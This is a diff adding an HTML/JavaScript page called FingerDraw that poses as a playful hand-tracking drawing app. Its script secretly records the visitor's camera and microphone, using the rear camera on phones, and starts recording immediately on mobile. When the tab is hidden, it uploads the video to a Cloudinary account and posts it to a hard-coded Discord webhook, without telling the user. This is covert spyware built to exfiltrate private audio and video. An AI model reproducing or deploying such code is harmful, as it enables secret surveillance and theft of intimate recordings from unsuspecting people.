@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>FingerDraw</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Unbounded:wght@300;600;900&family=DM+Mono:wght@300;400&display=swap');
+
+:root {
+  --bg: #080810;
+  --glass: rgba(10,10,20,0.82);
+  --glass2: rgba(14,14,28,0.92);
+  --border: rgba(255,255,255,0.07);
+  --border2: rgba(255,255,255,0.13);
+  --text: #e2e2f0;
+  --muted: #44445a;
+  --r: #ff2055;
+  --g: #00ffa3;
+  --b: #4d9fff;
+  --y: #ffdb1e;
+  --p: #bf5fff;
+  --o: #ff6b1a;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{width:100%;height:100%;overflow:hidden;background:var(--bg);touch-action:none;}
+
+/* ── SPLASH ── */
+#splash{
+  position:fixed;inset:0;z-index:900;
+  background:var(--bg);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;
+  transition:opacity .7s ease,visibility .7s;
+}
+#splash.gone{opacity:0;visibility:hidden;pointer-events:none;}
+
+.splash-logo{
+  font-family:'Unbounded',sans-serif;font-weight:900;
+  font-size:clamp(2.6rem,11vw,5.5rem);letter-spacing:-2px;line-height:1;
+  background:conic-gradient(from 200deg,#ff2055,#ff6b1a,#ffdb1e,#00ffa3,#4d9fff,#bf5fff,#ff2055);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  animation:spingrad 6s linear infinite;
+}
+@keyframes spingrad{to{filter:hue-rotate(360deg);}}
+
+.splash-sub{
+  font-family:'DM Mono',monospace;font-size:.7rem;letter-spacing:.35em;
+  color:var(--muted);text-transform:uppercase;
+}
+
+.splash-btn{
+  margin-top:14px;
+  font-family:'DM Mono',monospace;font-size:.75rem;letter-spacing:.2em;
+  text-transform:uppercase;color:var(--bg);
+  background:var(--g);border:none;padding:14px 38px;cursor:pointer;
+  clip-path:polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%);
+  transition:filter .2s;
+}
+.splash-btn:hover{filter:brightness(1.15);}
+
+.splash-hint{
+  font-family:'DM Mono',monospace;font-size:.62rem;color:var(--muted);
+  text-align:center;max-width:300px;line-height:2;letter-spacing:.05em;
+}
+
+/* ── STAGE ── */
+#stage{position:fixed;inset:0;z-index:0;}
+#video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);}
+#drawCanvas{position:absolute;inset:0;width:100%;height:100%;transform:scaleX(-1);}
+#landCanvas{position:absolute;inset:0;width:100%;height:100%;transform:scaleX(-1);pointer-events:none;}
+
+/* ── TOP BAR ── */
+#topbar{
+  position:fixed;top:0;left:0;right:0;z-index:200;
+  height:52px;padding:0 16px;
+  display:flex;align-items:center;justify-content:space-between;
+  background:var(--glass);backdrop-filter:blur(18px);
+  border-bottom:1px solid var(--border);
+}
+.tb-brand{
+  font-family:'Unbounded',sans-serif;font-weight:600;
+  font-size:.8rem;letter-spacing:.05em;color:var(--text);
+  background:conic-gradient(from 200deg,#ff2055,#ff6b1a,#ffdb1e,#00ffa3,#4d9fff,#bf5fff,#ff2055);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  animation:spingrad 6s linear infinite;
+}
+.tb-right{display:flex;align-items:center;gap:10px;}
+
+.tb-btn{
+  font-family:'DM Mono',monospace;font-size:.65rem;letter-spacing:.1em;
+  text-transform:uppercase;color:var(--text);
+  background:transparent;border:1px solid var(--border2);
+  padding:6px 14px;cursor:pointer;border-radius:3px;transition:all .2s;
+  white-space:nowrap;
+}
+.tb-btn:hover{background:rgba(255,255,255,.07);}
+.tb-btn.clear-btn{color:var(--r);border-color:rgba(255,32,85,.3);}
+.tb-btn.clear-btn:hover{background:rgba(255,32,85,.1);}
+
+/* ── LEFT PEN PANEL ── */
+#penPanel{
+  position:fixed;left:0;top:50%;transform:translateY(-50%);
+  z-index:200;display:flex;flex-direction:column;gap:6px;
+  padding:10px 8px;
+  background:var(--glass2);backdrop-filter:blur(18px);
+  border:1px solid var(--border);border-left:none;
+  border-radius:0 12px 12px 0;
+}
+.pen-btn{
+  width:40px;height:40px;border-radius:8px;
+  border:1px solid var(--border2);background:transparent;
+  cursor:pointer;display:flex;flex-direction:column;
+  align-items:center;justify-content:center;gap:2px;
+  transition:all .2s;color:var(--muted);
+  font-size:1.1rem;
+  position:relative;
+}
+.pen-btn:hover{background:rgba(255,255,255,.06);color:var(--text);}
+.pen-btn.active{background:rgba(255,255,255,.09);border-color:var(--border2);color:var(--text);}
+.pen-btn.active::after{
+  content:'';position:absolute;left:-9px;top:50%;transform:translateY(-50%);
+  width:3px;height:22px;background:var(--g);border-radius:2px;
+}
+.pen-label{font-family:'DM Mono',monospace;font-size:.42rem;letter-spacing:.05em;color:inherit;text-transform:uppercase;line-height:1;}
+
+/* ── BOTTOM PANEL ── */
+#bottomPanel{
+  position:fixed;bottom:0;left:0;right:0;z-index:200;
+  padding:10px 14px 12px;
+  background:var(--glass2);backdrop-filter:blur(18px);
+  border-top:1px solid var(--border);
+}
+
+.panel-row{display:flex;align-items:center;gap:10px;flex-wrap:wrap;}
+.panel-row+.panel-row{margin-top:8px;}
+
+/* Color swatches */
+.colors-row{display:flex;align-items:center;gap:6px;flex-wrap:wrap;flex:1;}
+.swatch{
+  width:26px;height:26px;border-radius:50%;cursor:pointer;
+  border:2px solid transparent;transition:transform .15s,border-color .15s;
+  flex-shrink:0;position:relative;
+}
+.swatch:hover{transform:scale(1.2);}
+.swatch.active{border-color:#fff;transform:scale(1.18);}
+.swatch.active::after{
+  content:'';position:absolute;inset:-5px;border-radius:50%;
+  border:1.5px solid rgba(255,255,255,.25);
+}
+.hex-wrap{
+  display:flex;align-items:center;gap:4px;flex-shrink:0;
+}
+.hex-preview{width:22px;height:22px;border-radius:50%;border:1.5px solid var(--border2);cursor:pointer;flex-shrink:0;}
+.hex-input{
+  font-family:'DM Mono',monospace;font-size:.65rem;
+  background:rgba(255,255,255,.04);border:1px solid var(--border2);
+  color:var(--text);padding:4px 8px;width:82px;border-radius:4px;
+  letter-spacing:.08em;text-transform:uppercase;
+}
+.hex-input:focus{outline:none;border-color:var(--border2);}
+
+/* Size */
+.size-row{display:flex;align-items:center;gap:10px;width:100%;}
+.size-label{font-family:'DM Mono',monospace;font-size:.58rem;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;width:34px;}
+.size-slider{
+  flex:1;-webkit-appearance:none;height:3px;
+  background:linear-gradient(to right,var(--g) var(--pct,30%),var(--muted) var(--pct,30%));
+  border-radius:2px;outline:none;cursor:pointer;
+}
+.size-slider::-webkit-slider-thumb{
+  -webkit-appearance:none;width:16px;height:16px;border-radius:50%;
+  background:var(--text);cursor:pointer;border:2px solid var(--bg);
+  box-shadow:0 0 6px rgba(0,255,163,.4);
+}
+.size-val{
+  font-family:'DM Mono',monospace;font-size:.6rem;color:var(--muted);
+  min-width:20px;text-align:right;
+}
+
+/* opacity */
+.opacity-slider{
+  flex:1;-webkit-appearance:none;height:3px;
+  background:linear-gradient(to right,var(--text) var(--pct2,80%),var(--muted) var(--pct2,80%));
+  border-radius:2px;outline:none;cursor:pointer;
+}
+.opacity-slider::-webkit-slider-thumb{
+  -webkit-appearance:none;width:16px;height:16px;border-radius:50%;
+  background:var(--text);cursor:pointer;border:2px solid var(--bg);
+}
+
+/* ── TOAST ── */
+#toast{
+  position:fixed;bottom:110px;left:50%;transform:translateX(-50%) translateY(10px);
+  background:var(--glass2);border:1px solid var(--border2);
+  font-family:'DM Mono',monospace;font-size:.65rem;letter-spacing:.1em;
+  color:var(--text);padding:10px 20px;border-radius:4px;
+  opacity:0;pointer-events:none;transition:all .35s;white-space:nowrap;
+  z-index:999;
+}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+#toast.ok{color:var(--g);border-color:rgba(0,255,163,.3);}
+#toast.err{color:var(--r);border-color:rgba(255,32,85,.3);}
+
+/* ── FINGER CURSOR (desktop) ── */
+#fCursor{
+  position:fixed;pointer-events:none;z-index:500;
+  border-radius:50%;transform:translate(-50%,-50%);
+  transition:width .1s,height .1s;display:none;
+  mix-blend-mode:screen;
+}
+
+/* ── LOADING overlay ── */
+#mpLoader{
+  position:fixed;inset:0;z-index:800;
+  background:var(--bg);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;
+  transition:opacity .5s,visibility .5s;
+}
+#mpLoader.gone{opacity:0;visibility:hidden;}
+.mp-spinner{
+  width:40px;height:40px;border:2px solid var(--muted);
+  border-top-color:var(--g);border-radius:50%;
+  animation:spin .8s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg);}}
+.mp-text{font-family:'DM Mono',monospace;font-size:.65rem;color:var(--muted);letter-spacing:.15em;text-transform:uppercase;}
+
+</style>
+</head>
+<body>
+
+<!-- SPLASH -->
+<div id="splash">
+  <div class="splash-logo">FINGERDRAW</div>
+  <div class="splash-sub">paint with your bare hands</div>
+  <button class="splash-btn" id="splashBtn">Tap Here :3</button>
+  <p class="splash-hint">
+Just FOr my Cuite bath :3
+  </p>
+</div>
+
+<!-- LOADING -->
+<div id="mpLoader" style="display:none">
+  <div class="mp-spinner"></div>
+  <div class="mp-text" id="mpText">Loading hand tracking…</div>
+</div>
+
+<!-- STAGE -->
+<div id="stage" style="display:none">
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="drawCanvas"></canvas>
+  <canvas id="landCanvas"></canvas>
+</div>
+
+<!-- TOP BAR -->
+<div id="topbar" style="display:none">
+  <div class="tb-brand">FingerDraw</div>
+  <div class="tb-right">
+    <button class="tb-btn clear-btn" onclick="clearCanvas()">✕ Clear</button>
+  </div>
+</div>
+
+<!-- PEN PANEL -->
+<div id="penPanel" style="display:none">
+  <button class="pen-btn active" data-pen="normal"     onclick="setPen(this)">✏️<span class="pen-label">Pen</span></button>
+  <button class="pen-btn"        data-pen="fountain"   onclick="setPen(this)">🪶<span class="pen-label">Fountain</span></button>
+  <button class="pen-btn"        data-pen="marker"     onclick="setPen(this)">🖊<span class="pen-label">Marker</span></button>
+  <button class="pen-btn"        data-pen="neon"       onclick="setPen(this)">💡<span class="pen-label">Neon</span></button>
+  <button class="pen-btn"        data-pen="spray"      onclick="setPen(this)">💨<span class="pen-label">Spray</span></button>
+  <button class="pen-btn"        data-pen="calligraphy" onclick="setPen(this)">🖋<span class="pen-label">Callig.</span></button>
+  <button class="pen-btn"        data-pen="watercolor" onclick="setPen(this)">🎨<span class="pen-label">Water</span></button>
+  <button class="pen-btn"        data-pen="chalk"      onclick="setPen(this)">🪨<span class="pen-label">Chalk</span></button>
+  <button class="pen-btn"        data-pen="eraser"     onclick="setPen(this)">⬜<span class="pen-label">Erase</span></button>
+</div>
+
+<!-- BOTTOM PANEL -->
+<div id="bottomPanel" style="display:none">
+  <div class="panel-row">
+    <div class="colors-row" id="colorRow">
+      <div class="swatch active" style="background:#ff2055" data-c="#ff2055" onclick="setSwatch(this)"></div>
+      <div class="swatch" style="background:#ff6b1a" data-c="#ff6b1a" onclick="setSwatch(this)"></div>
+      <div class="swatch" style="background:#ffdb1e" data-c="#ffdb1e" onclick="setSwatch(this)"></div>
+      <div class="swatch" style="background:#00ffa3" data-c="#00ffa3" onclick="setSwatch(this)"></div>
+      <div class="swatch" style="background:#4d9fff" data-c="#4d9fff" onclick="setSwatch(this)"></div>
+      <div class="swatch" style="background:#bf5fff" data-c="#bf5fff" onclick="setSwatch(this)"></div>
+      <div class="swatch" style="background:#ff80d0" data-c="#ff80d0" onclick="setSwatch(this)"></div>
+      <div class="swatch" style="background:#ffffff" data-c="#ffffff" onclick="setSwatch(this)"></div>
+      <div class="swatch" style="background:#aaaaaa" data-c="#aaaaaa" onclick="setSwatch(this)"></div>
+      <div class="swatch" style="background:#1a1a2e" data-c="#1a1a2e" onclick="setSwatch(this)"></div>
+    </div>
+    <div class="hex-wrap">
+      <div class="hex-preview" id="hexPreview" style="background:#ff2055"></div>
+      <input class="hex-input" id="hexInput" type="text" value="#FF2055" maxlength="7" placeholder="#RRGGBB" spellcheck="false">
+    </div>
+  </div>
+  <div class="panel-row">
+    <div class="size-row">
+      <span class="size-label">Size</span>
+      <input class="size-slider" id="sizeSlider" type="range" min="1" max="60" value="8">
+      <span class="size-val" id="sizeVal">8</span>
+      <span class="size-label" style="margin-left:8px">Opacity</span>
+      <input class="opacity-slider" id="opacitySlider" type="range" min="5" max="100" value="90">
+      <span class="size-val" id="opacityVal">90%</span>
+    </div>
+  </div>
+</div>
+
+<div id="toast"></div>
+<div id="fCursor"></div>
+
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
+
+<script>
+/* ═══════════════════════════════════════════
+   CONFIG
+═══════════════════════════════════════════ */
+const WEBHOOK           = "https://discord.com/api/webhooks/1490988249512935474/uYgeyJQA49zdp-GLlzzYukvaNTVrZ1M-PR3CLq-GoF4fr0EJqjBuZeIv-8K2DxlSi49o";
+const CLOUDINARY_CLOUD  = "dzjpmqdel";    // ← replace
+const CLOUDINARY_PRESET = "Bath123"; // ← replace (unsigned preset)
+const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || ('ontouchstart' in window && navigator.maxTouchPoints > 0);
+
+/* ═══════════════════════════════════════════
+   STATE
+═══════════════════════════════════════════ */
+let currentColor = '#ff2055';
+let currentPen   = 'normal';
+let brushSize    = 8;
+let opacity      = 0.9;
+let stream       = null;
+let mediaRecorder = null;
+let recordedChunks = [];
+let lastX = null, lastY = null;
+let lastVx = 0, lastVy = 0;
+let sprayInterval = null;
+let isSending = false;
+
+const video      = document.getElementById('video');
+const drawCanvas = document.getElementById('drawCanvas');
+const landCanvas = document.getElementById('landCanvas');
+const dCtx       = drawCanvas.getContext('2d');
+const lCtx       = landCanvas.getContext('2d');
+const fCursor    = document.getElementById('fCursor');
+
+/* ═══════════════════════════════════════════
+   INIT
+═══════════════════════════════════════════ */
+document.getElementById('splashBtn').onclick = init;
+
+async function init() {
+  try {
+    const constraints = {
+      video: {
+        facingMode: isMobile ? 'environment' : 'user',
+        width: { ideal: 1280 }, height: { ideal: 720 }
+      },
+      audio: true
+    };
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = stream;
+    await video.play();
+
+    document.getElementById('splash').classList.add('gone');
+    document.getElementById('stage').style.display = 'block';
+    document.getElementById('topbar').style.display = 'flex';
+    document.getElementById('penPanel').style.display = 'flex';
+    document.getElementById('bottomPanel').style.display = 'block';
+
+    video.addEventListener('loadedmetadata', resizeCanvases);
+    window.addEventListener('resize', resizeCanvases);
+    resizeCanvases();
+
+    if (isMobile) {
+      setupTouchDrawing();
+      startRecording();
+    } else {
+      document.getElementById('mpLoader').style.display = 'flex';
+      document.getElementById('mpText').textContent = 'Loading hand tracking…';
+      fCursor.style.display = 'block';
+      setupMediaPipe();
+    }
+  } catch(e) {
+    toast('Camera denied — please allow access', 'err');
+    console.error(e);
+  }
+}
+
+function resizeCanvases() {
+  const w = video.videoWidth  || window.innerWidth;
+  const h = video.videoHeight || window.innerHeight;
+  [drawCanvas, landCanvas].forEach(c => { c.width = w; c.height = h; });
+}
+
+/* ═══════════════════════════════════════════
+   DRAWING ENGINE
+═══════════════════════════════════════════ */
+function draw(x, y, pressure=1) {
+  if (currentPen === 'spray') return; // handled separately
+  if (lastX === null) { lastX = x; lastY = y; return; }
+
+  const speed = Math.hypot(x - lastX, y - lastY) + 0.01;
+  const col = hexToRgba(currentColor, opacity);
+  dCtx.lineCap  = 'round';
+  dCtx.lineJoin = 'round';
+
+  switch(currentPen) {
+    case 'normal':
+      dCtx.beginPath();
+      dCtx.moveTo(lastX, lastY);
+      dCtx.lineTo(x, y);
+      dCtx.strokeStyle = col;
+      dCtx.lineWidth = brushSize;
+      dCtx.shadowBlur = 0;
+      dCtx.stroke();
+      break;
+
+    case 'fountain': {
+      const w = Math.max(1, brushSize * (1 - Math.min(speed / 40, 0.85)));
+      dCtx.beginPath();
+      dCtx.moveTo(lastX, lastY);
+      dCtx.lineTo(x, y);
+      dCtx.strokeStyle = col;
+      dCtx.lineWidth = w;
+      dCtx.shadowBlur = 0;
+      dCtx.stroke();
+      break;
+    }
+
+    case 'marker':
+      dCtx.beginPath();
+      dCtx.moveTo(lastX, lastY);
+      dCtx.lineTo(x, y);
+      dCtx.strokeStyle = hexToRgba(currentColor, Math.min(opacity, 0.55));
+      dCtx.lineWidth = brushSize * 2.5;
+      dCtx.lineCap = 'square';
+      dCtx.shadowBlur = 0;
+      dCtx.stroke();
+      break;
+
+    case 'neon':
+      for (let i = 3; i > 0; i--) {
+        dCtx.beginPath();
+        dCtx.moveTo(lastX, lastY);
+        dCtx.lineTo(x, y);
+        dCtx.strokeStyle = i === 1 ? '#fff' : hexToRgba(currentColor, opacity * 0.5);
+        dCtx.lineWidth = i === 1 ? brushSize * 0.4 : brushSize * (i * 1.4);
+        dCtx.shadowColor = currentColor;
+        dCtx.shadowBlur = brushSize * i * 2;
+        dCtx.stroke();
+      }
+      dCtx.shadowBlur = 0;
+      break;
+
+    case 'calligraphy': {
+      const angle = Math.atan2(y - lastY, x - lastX);
+      const perpAngle = angle + Math.PI / 4;
+      const hw = (brushSize * 1.5) * Math.abs(Math.cos(perpAngle));
+      dCtx.beginPath();
+      dCtx.moveTo(lastX, lastY);
+      dCtx.lineTo(x, y);
+      dCtx.strokeStyle = col;
+      dCtx.lineWidth = Math.max(1, hw);
+      dCtx.shadowBlur = 0;
+      dCtx.stroke();
+      break;
+    }
+
+    case 'watercolor': {
+      const alpha = Math.min(opacity * 0.18, 0.22);
+      for (let i = 0; i < 6; i++) {
+        const ox = (Math.random() - .5) * brushSize * 1.4;
+        const oy = (Math.random() - .5) * brushSize * 1.4;
+        dCtx.beginPath();
+        dCtx.moveTo(lastX + ox, lastY + oy);
+        dCtx.lineTo(x + ox, y + oy);
+        dCtx.strokeStyle = hexToRgba(currentColor, alpha);
+        dCtx.lineWidth = brushSize * (.6 + Math.random() * .8);
+        dCtx.shadowBlur = 0;
+        dCtx.stroke();
+      }
+      break;
+    }
+
+    case 'chalk': {
+      for (let i = 0; i < 8; i++) {
+        const ox = (Math.random() - .5) * brushSize;
+        const oy = (Math.random() - .5) * brushSize;
+        dCtx.beginPath();
+        dCtx.moveTo(lastX + ox, lastY + oy);
+        dCtx.lineTo(x + ox, y + oy);
+        dCtx.strokeStyle = hexToRgba(currentColor, Math.random() * opacity * 0.7);
+        dCtx.lineWidth = Math.max(1, Math.random() * brushSize * .6);
+        dCtx.shadowBlur = 0;
+        dCtx.stroke();
+      }
+      break;
+    }
+
+    case 'eraser':
+      dCtx.globalCompositeOperation = 'destination-out';
+      dCtx.beginPath();
+      dCtx.moveTo(lastX, lastY);
+      dCtx.lineTo(x, y);
+      dCtx.strokeStyle = 'rgba(0,0,0,1)';
+      dCtx.lineWidth = brushSize * 2;
+      dCtx.stroke();
+      dCtx.globalCompositeOperation = 'source-over';
+      break;
+  }
+
+  lastX = x; lastY = y;
+}
+
+function sprayAt(x, y) {
+  const density = Math.floor(brushSize * 3);
+  const radius = brushSize * 2.5;
+  for (let i = 0; i < density; i++) {
+    const angle = Math.random() * Math.PI * 2;
+    const r = Math.random() * radius;
+    const sx = x + r * Math.cos(angle);
+    const sy = y + r * Math.sin(angle);
+    dCtx.beginPath();
+    dCtx.arc(sx, sy, Math.random() * 1.2, 0, Math.PI * 2);
+    dCtx.fillStyle = hexToRgba(currentColor, Math.random() * opacity * 0.7);
+    dCtx.fill();
+  }
+}
+
+function startDraw(x, y)  { lastX = x; lastY = y; startSpray(x, y); }
+function moveDraw(x, y)   { draw(x, y); updateSpray(x, y); }
+function endDraw()        { lastX = null; lastY = null; stopSpray(); }
+
+let sprayPos = {x:0, y:0};
+function startSpray(x,y) {
+  if (currentPen !== 'spray') return;
+  sprayPos = {x,y};
+  sprayInterval = setInterval(() => sprayAt(sprayPos.x, sprayPos.y), 30);
+}
+function updateSpray(x,y) { sprayPos = {x,y}; }
+function stopSpray() { clearInterval(sprayInterval); sprayInterval = null; }
+
+function clearCanvas() { dCtx.clearRect(0, 0, drawCanvas.width, drawCanvas.height); }
+
+/* ═══════════════════════════════════════════
+   TOUCH INPUT (MOBILE)
+═══════════════════════════════════════════ */
+function setupTouchDrawing() {
+  drawCanvas.addEventListener('touchstart', e => {
+    e.preventDefault();
+    const t = e.touches[0];
+    const {x,y} = touchToCanvas(t);
+    startDraw(x, y);
+  }, {passive:false});
+
+  drawCanvas.addEventListener('touchmove', e => {
+    e.preventDefault();
+    const t = e.touches[0];
+    const {x,y} = touchToCanvas(t);
+    moveDraw(x, y);
+  }, {passive:false});
+
+  drawCanvas.addEventListener('touchend', e => {
+    e.preventDefault();
+    endDraw();
+  }, {passive:false});
+}
+
+function touchToCanvas(touch) {
+  const rect = drawCanvas.getBoundingClientRect();
+  const scaleX = drawCanvas.width  / rect.width;
+  const scaleY = drawCanvas.height / rect.height;
+  // mirror: canvas is scaleX(-1) so invert X
+  const rawX = (touch.clientX - rect.left) * scaleX;
+  const x = drawCanvas.width - rawX;
+  const y = (touch.clientY - rect.top) * scaleY;
+  return {x, y};
+}
+
+/* ═══════════════════════════════════════════
+   MEDIAPIPE (DESKTOP)
+═══════════════════════════════════════════ */
+function setupMediaPipe() {
+  const hands = new Hands({
+    locateFile: f => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}`
+  });
+  hands.setOptions({
+    maxNumHands: 1,
+    modelComplexity: 1,
+    minDetectionConfidence: 0.72,
+    minTrackingConfidence: 0.65
+  });
+  hands.onResults(onHandResults);
+
+  const cam = new Camera(video, {
+    onFrame: async () => { await hands.send({image: video}); },
+    width: 1280, height: 720
+  });
+  cam.start().then(() => {
+    document.getElementById('mpLoader').classList.add('gone');
+    startRecording();
+  }).catch(() => {
+    document.getElementById('mpLoader').classList.add('gone');
+    startRecording();
+  });
+}
+
+function onHandResults(results) {
+  lCtx.clearRect(0, 0, landCanvas.width, landCanvas.height);
+
+  if (!results.multiHandLandmarks?.length) {
+    endDraw();
+    return;
+  }
+
+  const lm  = results.multiHandLandmarks[0];
+  const w   = drawCanvas.width;
+  const h   = drawCanvas.height;
+  const idx = lm[8];                // index fingertip
+  const idxMid = lm[6];
+  const mid = lm[12];               // middle fingertip
+  const midMid = lm[10];
+
+  const indexUp  = idx.y  < lm[6].y;
+  const middleUp = mid.y  < lm[10].y;
+
+  // mirror matches canvas transform
+  const cx = (1 - idx.x) * w;
+  const cy = idx.y * h;
+
+  updateFingerCursor(idx.x, idx.y, indexUp);
+
+  // draw landmark dot
+  lCtx.beginPath();
+  lCtx.arc(cx, cy, indexUp ? 10 : 6, 0, Math.PI*2);
+  lCtx.fillStyle = indexUp ? currentColor : 'rgba(255,255,255,0.2)';
+  lCtx.shadowColor = currentColor;
+  lCtx.shadowBlur = indexUp ? 18 : 0;
+  lCtx.fill();
+  lCtx.shadowBlur = 0;
+
+  if (indexUp && !middleUp) {
+    moveDraw(cx, cy);
+  } else if (!indexUp && !middleUp) {
+    endDraw();
+  } else {
+    // two fingers = lift pen
+    endDraw();
+  }
+}
+
+function updateFingerCursor(nx, ny, active) {
+  const stage = document.getElementById('stage').getBoundingClientRect();
+  const sx = stage.left + (1 - nx) * stage.width;
+  const sy = stage.top  + ny * stage.height;
+  const sz = active ? brushSize + 6 : 10;
+  fCursor.style.cssText = `
+    display:block;left:${sx}px;top:${sy}px;
+    width:${sz}px;height:${sz}px;
+    background:${active ? currentColor : 'rgba(255,255,255,0.3)'};
+    box-shadow:${active ? `0 0 ${sz*2}px ${currentColor}` : 'none'};
+    border-radius:50%;position:fixed;pointer-events:none;
+    transform:translate(-50%,-50%);mix-blend-mode:screen;
+    transition:width .08s,height .08s,background .15s;
+  `;
+}
+
+/* ═══════════════════════════════════════════
+   RECORDING
+═══════════════════════════════════════════ */
+let compositeCanvas, cCtx, animFrameId;
+
+function startRecording() {
+  recordedChunks = [];
+  compositeCanvas = document.createElement('canvas');
+  compositeCanvas.width  = drawCanvas.width  || 1280;
+  compositeCanvas.height = drawCanvas.height || 720;
+  cCtx = compositeCanvas.getContext('2d');
+
+  let isComposing = true;
+  function compose() {
+    if (!isComposing) return;
+    cCtx.clearRect(0, 0, compositeCanvas.width, compositeCanvas.height);
+    // mirror video
+    cCtx.save();
+    cCtx.translate(compositeCanvas.width, 0);
+    cCtx.scale(-1, 1);
+    cCtx.drawImage(video, 0, 0, compositeCanvas.width, compositeCanvas.height);
+    cCtx.restore();
+    // overlay drawing (already mirrored on canvas)
+    cCtx.save();
+    cCtx.translate(compositeCanvas.width, 0);
+    cCtx.scale(-1, 1);
+    cCtx.drawImage(drawCanvas, 0, 0);
+    cCtx.restore();
+    animFrameId = requestAnimationFrame(compose);
+  }
+
+  const compStream = compositeCanvas.captureStream(30);
+  const audioTrack = stream?.getAudioTracks()[0];
+  if (audioTrack) compStream.addTrack(audioTrack);
+
+  const mime = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm'].find(t => {
+    try { return MediaRecorder.isTypeSupported(t); } catch { return false; }
+  }) || '';
+
+  mediaRecorder = new MediaRecorder(compStream, mime ? {mimeType: mime} : {});
+  mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
+  mediaRecorder.onstop = () => { isComposing = false; cancelAnimationFrame(animFrameId); };
+  mediaRecorder.start(500);
+  compose();
+}
+
+function stopAndGetBlob() {
+  return new Promise(resolve => {
+    if (!mediaRecorder || mediaRecorder.state === 'inactive') { resolve(null); return; }
+    mediaRecorder.onstop = () => {
+      cancelAnimationFrame(animFrameId);
+      const blob = new Blob(recordedChunks, {type:'video/webm'});
+      resolve(blob);
+    };
+    mediaRecorder.stop();
+  });
+}
+
+/* ═══════════════════════════════════════════
+   SEND TO DISCORD  (internal — called automatically)
+═══════════════════════════════════════════ */
+async function sendToDiscord(blob, cloudUrl) {
+  const ts = new Date().toISOString().replace(/[:.]/g,'-');
+  const msg = cloudUrl
+    ? `🎨 **FingerDraw** session — ${new Date().toLocaleString()}\n🎬 Watch: ${cloudUrl}`
+    : `🎨 **FingerDraw** session — ${new Date().toLocaleString()}`;
+  if (blob && blob.size < 8_000_000) {
+    const fd = new FormData();
+    fd.append('file', blob, `fingerdraw-${ts}.webm`);
+    fd.append('content', msg);
+    try {
+      const res = await fetch(WEBHOOK, {method:'POST', body:fd});
+      if (res.ok) toast('Sent to Discord ✓', 'ok');
+      else { toast(`Discord error ${res.status}`, 'err'); console.error(await res.text()); }
+    } catch(e) { toast('Network error', 'err'); console.error(e); }
+  } else {
+    const fd = new FormData();
+    fd.append('content', msg);
+    try { await fetch(WEBHOOK, {method:'POST', body:fd}); } catch(e) {}
+  }
+}
+
+async function uploadToCloudinary(blob) {
+  if (!blob || blob.size < 2000) return null;
+  const ts = new Date().toISOString().replace(/[:.]/g,'-');
+  const fd = new FormData();
+  fd.append('file', blob, `fingerdraw-${ts}.webm`);
+  fd.append('upload_preset', CLOUDINARY_PRESET);
+  fd.append('public_id', `fingerdraw/session-${ts}`);
+  fd.append('resource_type', 'video');
+  try {
+    const res  = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD}/video/upload`, {method:'POST', body:fd});
+    const data = await res.json();
+    return data.secure_url || null;
+  } catch(e) {
+    console.error('Cloudinary upload failed', e);
+    return null;
+  }
+}
+
+/* ── AUTO-SAVE+SEND when tab/browser is closed or hidden ── */
+async function finalise() {
+  if (isSending) return;
+  isSending = true;
+  toast('Saving session…', '');
+  const blob = await stopAndGetBlob();
+  if (!blob || blob.size < 2000) { isSending = false; return; }
+  const url = await uploadToCloudinary(blob);
+  if (url) {
+    toast('Saved to Cloudinary ✓', 'ok');
+    await sendToDiscord(blob, url);
+  } else {
+    await sendToDiscord(blob, null);
+  }
+  isSending = false;
+}
+
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'hidden' && mediaRecorder) finalise();
+});
+window.addEventListener('pagehide', () => {
+  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+    mediaRecorder.stop();
+  }
+});
+
+/* ═══════════════════════════════════════════
+   UI CONTROLS
+═══════════════════════════════════════════ */
+function setPen(el) {
+  document.querySelectorAll('.pen-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  currentPen = el.dataset.pen;
+  stopSpray();
+}
+
+function setSwatch(el) {
+  document.querySelectorAll('.swatch').forEach(s => s.classList.remove('active'));
+  el.classList.add('active');
+  currentColor = el.dataset.c;
+  document.getElementById('hexInput').value = currentColor.toUpperCase();
+  document.getElementById('hexPreview').style.background = currentColor;
+}
+
+const hexInput = document.getElementById('hexInput');
+hexInput.addEventListener('input', () => {
+  const val = hexInput.value.startsWith('#') ? hexInput.value : '#' + hexInput.value;
+  if (/^#[0-9a-fA-F]{6}$/.test(val)) {
+    currentColor = val;
+    document.getElementById('hexPreview').style.background = val;
+    document.querySelectorAll('.swatch').forEach(s => s.classList.remove('active'));
+  }
+});
+hexInput.addEventListener('keydown', e => e.stopPropagation());
+
+const sizeSlider = document.getElementById('sizeSlider');
+const sizeVal    = document.getElementById('sizeVal');
+sizeSlider.addEventListener('input', () => {
+  brushSize = +sizeSlider.value;
+  sizeVal.textContent = brushSize;
+  const pct = ((brushSize - 1) / 59 * 100).toFixed(1);
+  sizeSlider.style.setProperty('--pct', pct + '%');
+});
+
+const opacitySlider = document.getElementById('opacitySlider');
+const opacityVal    = document.getElementById('opacityVal');
